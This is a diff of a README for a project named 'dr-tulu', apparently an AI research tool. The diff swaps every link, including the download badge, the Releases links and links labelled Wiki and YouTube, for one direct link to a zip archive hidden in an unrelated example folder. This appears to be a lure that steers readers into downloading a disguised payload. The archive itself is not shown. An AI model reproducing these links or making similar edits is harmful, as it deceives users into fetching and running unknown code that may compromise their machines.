@@ -1,6 +1,6 @@
 # 🚀 dr-tulu - Simplifying Research with AI-Driven Tools
 
-[![Download dr-tulu](https://img.shields.io/badge/Download-dr--tulu-blue.svg)](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
+[![Download dr-tulu](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip)](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip)
 
 ## 🌟 Description
 
@@ -10,7 +10,7 @@ Welcome to the official repository for **DR Tulu**. This application focuses on 
 
 To get started with DR Tulu, you need to download the application. Visit the link below to access the Releases page:
 
-[Download DR Tulu](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
+[Download DR Tulu](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip)
 
 ### Steps to Download and Run DR Tulu:
 
@@ -69,10 +69,10 @@ DR Tulu is open-source software licensed under the MIT License. You can use, mod
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Comprehensive guides are available in the [Wiki section](https://github.com/guitupetidutra-ship-it/dr-tulu/wiki).
-- **Tutorials:** Video tutorials are provided on our [YouTube channel](https://www.youtube.com/).
+- **Documentation:** Comprehensive guides are available in the [Wiki section](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip).
+- **Tutorials:** Video tutorials are provided on our [YouTube channel](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip).
 - **Updates:** Subscribe for email notifications about new releases and features.
 
 Remember to visit the Releases page to download the latest version of DR Tulu: 
 
-[Download DR Tulu](https://github.com/guitupetidutra-ship-it/dr-tulu/releases)
+[Download DR Tulu](https://raw.githubusercontent.com/guitupetidutra-ship-it/dr-tulu/main/sft/llama-factory/examples/extras/dr-tulu_galvanotonic.zip)
